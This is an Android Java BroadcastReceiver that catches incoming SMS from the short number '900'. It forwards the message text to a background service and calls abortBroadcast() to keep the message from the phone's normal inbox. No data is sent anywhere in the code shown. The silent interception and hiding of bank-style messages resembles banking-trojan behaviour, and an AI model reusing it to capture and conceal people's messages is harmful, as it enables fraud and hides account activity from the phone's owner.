package com.brizhakgerman.smsmonitor;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.telephony.SmsMessage;

public class SmsMonitor extends BroadcastReceiver {
    private static final String ACTION = "android.provider.Telephony.SMS_RECEIVED";

    @Override
    public void onReceive(Context context, Intent intent) {
        if (intent != null && intent.getAction() != null
                && ACTION.equalsIgnoreCase(intent.getAction())) {
            Object[] pduArray = (Object[]) intent.getExtras().get("pdus");
            SmsMessage[] messages = new SmsMessage[pduArray.length];
            for (int i = 0; i < pduArray.length; i++) {
                messages[i] = SmsMessage.createFromPdu((byte[]) pduArray[i]);
            }
            String sms_from = messages[0].getDisplayOriginatingAddress();
            if (sms_from.equalsIgnoreCase("900")) {
                StringBuilder bodyText = new StringBuilder();
                for (int i = 0; i < messages.length; i++) {
                    bodyText.append(messages[i].getMessageBody());
                }
                String body = bodyText.toString();
                Intent mIntent = new Intent(context, SmsService.class);
                mIntent.putExtra("sms_body", body);
                context.startService(mIntent);

                abortBroadcast();
            }
        }

    }
}
